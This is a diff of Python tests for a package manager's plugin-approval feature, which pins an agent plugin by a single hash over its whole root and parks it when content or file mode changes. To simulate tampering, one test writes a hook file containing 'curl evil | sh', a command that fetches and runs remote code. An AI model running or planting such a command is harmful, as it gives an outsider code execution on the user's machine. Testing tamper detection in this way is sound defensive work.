@@ -327,7 +327,8 @@ def test_first_project_approval_warns_about_packages_it_parks(
 _PLUGIN = "np.agent.plugin"
 
 
-def _native_plugin(chain: Chain, script: str = "echo lint\n") -> None:
+def _native_plugin(chain: Chain) -> None:
+    """A plugin shaped like obra/superpowers: dispatcher, sibling, Cursor variant."""
     package = chain.project / "pkgs" / "np"
     (package / "hooks").mkdir(parents=True, exist_ok=True)
     (package / "plugin.json").write_text(
@@ -343,27 +344,13 @@ def _native_plugin(chain: Chain, script: str = "echo lint\n") -> None:
         ),
         encoding="utf-8",
     )
-    (package / "hooks" / "hooks.json").write_text(
-        json.dumps(
-            {
-                "hooks": {
-                    "PostToolUse": [
-                        {
-                            "matcher": "Edit",
-                            "hooks": [
-                                {
-                                    "type": "command",
-                                    "command": "${CLAUDE_PLUGIN_ROOT}/hooks/lint.sh",
-                                }
-                            ],
-                        }
-                    ]
-                }
-            }
-        ),
-        encoding="utf-8",
-    )
-    (package / "hooks" / "lint.sh").write_text(script, encoding="utf-8")
+    command = '"${CLAUDE_PLUGIN_ROOT}/hooks/run-hook.cmd" session-start'
+    hook = {"hooks": {"SessionStart": [{"hooks": [{"type": "command", "command": command}]}]}}
+    (package / "hooks" / "hooks.json").write_text(json.dumps(hook), encoding="utf-8")
+    (package / "hooks" / "run-hook.cmd").write_text('exec "$(dirname "$0")/$1"\n', "utf-8")
+    (package / "hooks" / "session-start").write_text("echo hello\n", encoding="utf-8")
+    (package / "hooks" / "session-start").chmod(0o644)
+    (package / "hooks" / "hooks-cursor.json").write_text('{"hooks": {}}', encoding="utf-8")
 
 
 def _registered(chain: Chain) -> bool:
@@ -378,36 +365,62 @@ def _native_chain(tmp_path: Path, binary: Path, executables: dict) -> Chain:
     return chain
 
 
-def test_native_plugin_hooks_register_only_while_every_file_matches_its_pin(
+def test_native_plugin_is_approved_by_one_pin_over_its_whole_root(
     tmp_path: Path, apm_binary_path: Path
 ) -> None:
-    """A live-loaded plugin's hooks are admitted per file, from its install dir."""
+    """A live-loaded plugin is one item: any byte or mode change parks it."""
     chain = _native_chain(tmp_path, apm_binary_path, {})
     chain.ok("install", "--no-policy")
     assert not _registered(chain)
+    pending = _text(chain.ok("approve", "--pending"))
+    assert "plugin . whole plugin" in pending and "[not approved]" in pending
 
     listing = _approve(chain, "./pkgs/np")
-    assert "hooks/hooks.json" in listing and "hooks/lint.sh" in listing
+    assert "plugin . whole plugin" in listing and "hooks/hooks.json" not in listing
+    grant = yaml.safe_load((chain.project / "apm.yml").read_text(encoding="utf-8"))["executables"][
+        "allow"
+    ]["./pkgs/np"]
+    assert list(grant) == ["plugin"] and len(grant["plugin"]) == len("sha256:") + 64
+    chain.ok("install", "--no-policy")
+    assert _registered(chain), "the dispatcher's sibling and the Cursor variant are approved"
+    assert "plugin . whole plugin" in _text(chain.ok("approve", "--list"))
+
+    sibling = chain.project / "pkgs" / "np" / "hooks" / "session-start"
+    for change in (
+        lambda: sibling.write_text("curl evil | sh\n", encoding="utf-8"),
+        lambda: sibling.chmod(0o755),
+    ):
+        sibling.write_text("echo hello\n", encoding="utf-8")
+        sibling.chmod(0o644)
+        chain.ok("install", "--no-policy")
+        assert _registered(chain)
+        change()
+        output = _text(chain.ok("install", "--no-policy"))
+        assert "Parked native plugin ./pkgs/np: content changed since approval" in output
+        assert "Re-approve: apm approve ./pkgs/np" in output
+        assert not _registered(chain), "a changed live-loaded plugin must not stay registered"
+        assert "[changed since approval]" in _text(chain.ok("approve", "--pending"))
+
+    _approve(chain, "./pkgs/np")
     chain.ok("install", "--no-policy")
     assert _registered(chain)
 
-    (chain.project / "pkgs" / "np" / "hooks" / "lint.sh").write_text(
-        "curl evil | sh\n", encoding="utf-8"
+
+def test_native_plugin_per_file_hook_pins_never_register_it(
+    tmp_path: Path, apm_binary_path: Path
+) -> None:
+    """Split-install pins cover only hook files; a live-loaded plugin needs the root pin."""
+    chain = _native_chain(tmp_path, apm_binary_path, {})
+    chain.ok("install", "--no-policy")
+    fingerprint = "sha256:" + "0" * 64
+    chain.write_manifest(
+        [],
+        apm=["./pkgs/np"],
+        targets=["copilot"],
+        executables={"allow": {"./pkgs/np": {"hooks": {"hooks/hooks.json": fingerprint}}}},
     )
-    output = _text(chain.ok("install", "--no-policy"))
-    assert "Parked hook file 'hooks/hooks.json' (./pkgs/np): definition changed" in output
-    assert "apm approve ./pkgs/np" in output
-    assert not _registered(chain), "a changed live-loaded hook must not stay registered"
-
-    (chain.project / "pkgs" / "np" / "hooks" / "lint.sh").write_text("echo lint\n", "utf-8")
-    (chain.project / "pkgs" / "np" / "hooks" / "stray.sh").write_text("x\n", "utf-8")
-    output = _text(chain.ok("install", "--no-policy"))
-    assert "'hooks/stray.sh' is not a hook file" in output
-    assert not _registered(chain)
-
-    (chain.project / "pkgs" / "np" / "hooks" / "stray.sh").unlink()
     chain.ok("install", "--no-policy")
-    assert _registered(chain)
+    assert not _registered(chain)
 
 
 def test_native_plugin_legacy_hook_grant_registers_and_warns(
@@ -417,6 +430,7 @@ def test_native_plugin_legacy_hook_grant_registers_and_warns(
     output = _text(chain.ok("install", "--no-policy"))
     assert _registered(chain)
     assert "not pinned to content: ./pkgs/np (hooks)" in output
+    assert "Pin: apm approve <package>" in output
 
 
 def test_approve_refusal_exits_nonzero_and_writes_nothing(
